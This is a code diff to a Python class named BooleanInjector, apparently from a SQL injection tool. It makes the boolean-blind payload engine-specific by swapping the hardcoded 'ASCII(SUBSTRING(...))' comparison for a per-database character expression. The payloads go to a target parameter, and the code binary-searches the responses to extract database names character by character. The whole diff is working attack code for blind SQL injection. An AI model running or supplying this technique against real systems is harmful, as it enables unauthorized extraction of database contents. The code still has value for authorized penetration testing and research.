@@ -22,6 +22,10 @@ class BooleanInjector:
     def __init__(self, requester: Requester, analyzer: Analyzer):
         self.requester = requester
         self.analyzer = analyzer
+        self.database_engine = None
+
+    def set_database_engine(self, database_engine: str) -> None:
+        self.database_engine = database_engine
 
     def detect_database_engine(self, param: str, ctx: InjectionContext) -> str:
         """
@@ -95,6 +99,7 @@ class BooleanInjector:
 
     def get_db_elem_name(
         self,
+        database_engine: str,
         param: str,
         ctx: InjectionContext,
         expression: str,
@@ -106,6 +111,11 @@ class BooleanInjector:
         """
 
         expr_name = ""
+        
+        # Get the database-specific expression to handle characters
+        char_expression = fingerprints[database_engine.lower()].char
+        if char_expression is None:
+            return ""
 
         # Baseline for a query containing a false condition. If another response differs from this,
         # it would probably mean that the tested condition is true.
@@ -118,7 +128,10 @@ class BooleanInjector:
             while low < high:
                 mid = (low + high) // 2
 
-                payload = f"{ctx.prefix}AND ASCII(SUBSTRING({expression},{digit},1))>{mid}{ctx.suffix}"
+                formatted_char_expression = char_expression.format(expression=expression, digit=digit)
+                # Logger.debug(f"Formatted char expression: {formatted_char_expression}")
+
+                payload = f"{ctx.prefix}AND {formatted_char_expression}>{mid}{ctx.suffix}"
                 response = self.requester.send({param: payload})
 
                 # If different then the condition is right
@@ -137,6 +150,7 @@ class BooleanInjector:
 
     def get_db_elem_name_chars_at_index(
         self,
+        database_engine: str,
         param: str,
         ctx: InjectionContext,
         expression: str,
@@ -146,6 +160,11 @@ class BooleanInjector:
         Returns a given element's character at the given indexes by checking the
         results of boolean blind tests.
         """
+
+        # Get the database-specific expression to handle characters
+        char_expression = fingerprints[database_engine.lower()].char
+        if char_expression is None:
+            return []
 
         found_chars: list[str] = []
         # Baseline for a query containing a false condition. If another response differs from this,
@@ -159,7 +178,10 @@ class BooleanInjector:
             while low < high:
                 mid = (low + high) // 2
 
-                payload = f"{ctx.prefix}AND ASCII(SUBSTRING({expression},{digit},1))>{mid}{ctx.suffix}"
+                formatted_char_expression = char_expression.format(expression=expression, digit=digit)
+
+                payload = f"{ctx.prefix}AND {formatted_char_expression}>{mid}{ctx.suffix}"
+
                 response = self.requester.send({param: payload})
 
                 # Add the length of the payload as baseline response doesn't contain expression
